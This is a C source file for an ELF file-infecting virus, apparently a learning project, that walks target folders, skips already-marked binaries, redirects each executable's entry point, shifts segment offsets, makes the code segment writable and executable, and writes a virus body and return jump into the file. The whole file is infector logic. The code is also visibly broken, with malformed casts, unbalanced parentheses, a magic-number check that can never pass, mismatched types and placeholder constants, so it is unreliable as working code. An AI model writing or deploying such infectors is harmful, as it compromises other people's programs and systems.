#include "infection.h"

/*
** takes the bytes and the size of the elf we want to infect
** if program header and offsets integrity are corrupted returns failure
*/
char                check_header_sanity(char *map, int size)
{
    Elf64_Ehdr      *hdr;
    
    if (size < sizeof(Elf64_Ehdr))
        return (FAILURE);
    hdr = (Elf64_Ehdr *)map;
    /* check elf signature */
    if (hdr->e_ident[0] != 0x7f || hdr->e_ident[0] != 'E'
            || hdr->e_ident[0] != 'L' || hdr->e_ident[0] != 'F')
        return (FAILURE);
    /* check header's elf integrity */
    if (hdr->e_ident[EI_CLASS] != ELFCLASS64
            || hdr->e_ident[EI_VERSION] != EV_CURRENT
            || hdr->e_ident[EI_DATA] == ELFDATANONE
            || hdr->e_type != ET_EXEC && hdr->e_type != ET_DYN
            || hdr->e_machine != EM_X86_64)
        return (FAILURE);
    /* check offsets */
    if (hdr->e_phoff != sizeof(Elf64_Ehdr)
	        || hdr->e_phoff + hdr->e_phnum * sizeof(Elf64_Phdr) > (Elf64_Off)size
	        || hdr->e_shoff < sizeof(Elf64_Ehdr)
	        || hdr->e_shoff + hdr->e_shnum * sizeof(Elf64_Shdr) > (Elf64_Off)size
	        || hdr->e_ehsize != sizeof(Elf64_Ehdr)
	        || hdr->e_phentsize != sizeof(Elf64_Phdr)
	        || hdr->e_shentsize != sizeof(Elf64_Shdr)
	        || hdr->e_shstrndx <= SHN_UNDEF || hdr->e_shstrndx >= hdr->e_shnum)
		return (FAILURE);
    return (SUCCESS);
}

#define SIGNATURE       123
#define VIRUS_SIZE      456
#define VIRUS           789

char                infect_folder_entry_point(char *self_name, const char *path)
{
    char            **files;
    t_entry         entry;
    int             i;

    files = NULL;
    files = get_elf_files(files, (char *)path, ELF_x64);
    i = -1;
    while (++i < (int)mtrx2d_len(files))
    {
        if (!strcmp(self_name, files[i]))
            continue ;
        if (infection_entry_point(&entry, SIGNATURE, VIRUS_SIZE, path)
                || write_entry_point_infection(&entry, SIGNATURE, VIRUS))
            return (FAILURE);
    }
    return (SUCCESS);
}

#define TARGETS     {"/tmp/test/", "/tmp/test2/", NULL}

char                infect_all_targets(char *argv)
{
    const char      *targets[] = TARGETS;
    int             i;

    i = -1;
    while (targets[++i])
        if (infect_folder_entry_point(argv, targets[i]) == FAILURE)
            return (FAILURE);
    return (SUCCESS);
}


/*
**      --> ENTRY POINT METHOD INFECTION
**      puts virus in .text and chage entry point
*/

/*
**      --> find the PT_LOAD segment who contains the .text section
*/
void                    find_text_section(t_entry *entry)
{
    register int        i;
    register int        j;
    char                *section_name;
    char                *section_table;
    int                 idx;

    i = -1;
    idx = ((Elf64_Ehdr *)entry->data)->e_shstrndx;
    section_table = (char *)entry->data + entry->section[idx].sh_offset;
    while (++i < ((Elf64_Ehdr *)entry->data)->e_shnum)
    {
        section_name = section_table + entry->section[i].sh_name;
        if (!strcmp(section_name, ".text"))
        {
            entry->saved_section = entry->section + i;
            j = -1;
            while (++j < ((Elf64_Ehdr *)entry->data)->e_phnum)
            {
                if (entry->program[j].p_type == PT_LOAD
                        && entry->saved_section->sh_offset >= entry->program[j].p_vaddr
                        && entry->saved_section->sh_offset < entry->program[j].p_vaddr
                        + entry->program[j].p_filesz)
                {
                        entry->saved_program = entry->program + j;
                        return ;
                }
            }
            return ;
        }
    }
}

/*
**      --> Finds the PT_LOAD segment who contains the entry point
*/
void                    find_entry_point(t_entry  *entry)
{
    register int        i;
    register int        j;

    i = -1;
    while (++i < ((Elf64_Ehdr *)entry->data)->e_shnum)
    {
        entry->saved_section = entry->section + i;
        if (((Elf64_Ehdr *)entry->data)->e_entry >= entry->saved_section->sh_addr
                && ((Elf64_Ehdr *)entry->data)->e_entry < entry->saved_section->sh_addr
                + entry->saved_section->sh_size)
        {
            j = -1;
            while (++j < ((Elf64_Ehdr *)entry->data)->e_phnum)
            {
                if (entry->program[j].p_type == PT_LOAD
                    && ((Elf64_Ehdr *)entry->data)->e_entry >= entry->program[j].p_vaddr
                    && ((Elf64_Ehdr *)entry->data)->e_entry < entry->program[j].p_vaddr
                    + entry->program[j].p_filesz)
                {
                    entry->saved_program = entry->program + j;
                    return ;
                }
            }
            return ;
        }
    }
}

/*
**      --> Check if the elf file is alreaddy infected
*/
char                    is_not_infected(t_entry *entry, uint64_t signature)
{
    const uint64_t      file_signature = *(uint64_t)((char *)entry->data + ((Elf64_Ehdr *)entry->data)->e_entry
            - entry->saved_program->p_vaddr + sizeof(signature);
    if (file_signature == signature)
        return (FAILURE);
    return (SUCCESS);
}

/*
**      --> Check if file has room place into the padding of the .text or
**          some offset shitf is needed (+ calc padding and alighment)
*/
char                    room_manager(t_entry *entry, uint32_t virus_size, uint64_t signature)
{
    register int        i;
    Elf64_Addr          *next_ptload;

    i = -1;
    next_ptload = NULL;
    while (++i < ((Elf64_Ehdr *)entry->data)->e_phnum)
        if (entry->saved_program->p_offset + entry->saved_program->p_filesz
                && (!next_ptload || entry->program[i]->p_offset < next_ptload->p_offset))
            next_ptload = entry->program + i;
    if (!next_ptload)
        return (FAILURE);
    entry->virus_size = entry->virus_size + signature;
    entry->padding = 0;
    /* true : no room space */
    if (entry->saved_program->p_offset + entry->saved_program->p_filesz > next_ptload->p_offset)
    {
        if (shift_offsets(entry) == FAILURE)
            return (FAILURE);
    }
    else
        entry->padding = virus_size;
    return (SUCCESS);
}

/*
**      --> auxilar from room_manager(), shift offsets align with the page size
*/

char                shift_offsets(t_entry *entry)
{
    register int    i;

    while (entry->padding < entry->virus_size)
        entry->padding += PAGE_SIZE;
    
    /* segment table offset */
    ((Elf64_Phdr *)entry->data)->p_offset += entry->padding;

    /* program offset */
    i = -1;
    while (++i < ((Elf64_Ehdr *)entry->data)->e_phnum)
        if (entry->program[i].p_offset >= entry->saved_program->p_offset
                + entry->saved_program->p_filesz)
        {
            if (entry->saved_program->p_offset + entry->saved_program->p_filesz
                    + entry->padding > entry->program[i].p_vaddr)
                return (FAILURE);
            entry->program[i].p_offset += entry->padding;
        }
    
    /* sections offsets */
    i = -1;
    while (++i < ((Elf64_Ehdr *)entry->data)->e_shnum)
        if (entry->section[i].sh_offset >= entry->saved_program->p_offset
                + entry->saved_program->p_filesz)
            entry->program[i].p_offset += entry->padding;
    return (SUCCESS);
}

/*
**      takes an empty t_entry and takes all the values needed for write the elf
*/
char                infection_entry_point(t_entry *entry, uint64_t signature, uint32_t virus_size, const char *path)
{
    entry->program = (Elf64_Ehdr *)((char *)entry->data + ((Elf64_Ehdr *)entry->data)->e_phoff);
    entry->section = (Elf64_Ehdr *)((char *)entry->data + ((Elf64_Ehdr *)entry->data)->e_shoff);
    entry->saved_program = NULL;
    entry->saved_section = NULL;

    if (check_header_sanity((char *)entry->data, (int)entry->data_size) == FAILURE)
        return (FAILURE);
    find_text_section(entry);
    if (!entry->saved_program || !entry->saved_section)
        find_entry_point(entry);
    if (!entry->saved_program || !entry->saved_section)
        return (FAILURE);
    if (is_not_infected(entry, signature) == FAILURE)
        return (FAILURE);
    if ((entry->fd = syscall(SYS_OPEN, path, O_WRONLY | O_TRUNC | O_EXCL) == FAILURE)
        return (FAILURE);
    entry->offset = entry->saved_program->p_offset + entry->saved_program->p_filesz;
    entry->original_entry = -(entry->offset - ((Elf64_Ehdr *)entry->data)->e_entry 
            - entry->saved_program->v_addr + sizeof(signature);
    /* new entry point */
    ((Elf64_Ehdr *)entry->data)->e_entry = entry->offset + entry->saved_program->p_vaddr + sizeof(signature);
    if (room_manager(entry, virus_size, signature) == FAILURE)
        return (FAILURE);
    entry->virus_size = virus_size;
    return (SUCCESS);
}

char                write_entry_point_infection(t_entry *entry, uint32_t siganture, uint32_t virus)
{
    /* update sizes */
    entry->saved_program->p_filesz += entry->padding;
    entry->saved_program->p_memsz += entry->padding;
    /* allow rights */
    entry->saved_program->p_flags = PF_R | PF_W | PF_X;
    // need that ?
    entry->section->sh_size += entry->padding;
    (void)syscall(SYS_WRITE, entry->fd, entry->data, entry->offset);
    (void)syscall(SYS_WRITE, entry->fd, &signature, sizeof(signature));
    // 3rd write probally is bad in addr and size
    (void)syscall(SYS_WRITE, entry->fd, &virus, entry->virus_size - sizeof(entry->original_entry));
    (void)syscall(SYS_WRITE, entry->fd, &entry->original_entry, sizeof(entry->original_entry));
    /* padding */
    if (entry->padding == entry->virus_size)
        entry->offset += entry->virus_size;
    else
        while (entry->padding-- > entry->virus_size)
            (void)syscall(SYS_WRITE, entry->fd, '\0', 1);
    (void)syscall(SYS_WRITE, entry->fd, (char *)entry->data + entry->offset, entry->data_size - entry->offset -1);
    if (syscall(SYS_CLOSE, entry->fd) == FAILURE)
        return (FAILURE);
    return (SUCCESS);
}



